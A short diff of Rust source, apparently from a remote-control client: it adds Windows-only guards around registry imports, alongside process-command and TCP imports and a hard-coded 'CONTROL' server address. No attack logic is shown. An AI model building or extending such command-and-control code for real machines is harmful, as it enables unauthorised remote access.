@@ -11,10 +11,15 @@ use std::process::Command;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 use tokio::time::{sleep, Duration};
+
+#[cfg(target_os = "windows")]
 use winreg::enums::*;
+#[cfg(target_os = "windows")]
 use winreg::RegKey;
 
 pub mod commands;
+
+#[cfg(target_os = "windows")]
 pub mod console;
 
 const CONTROL: &str = "192.168.1.154:8080";
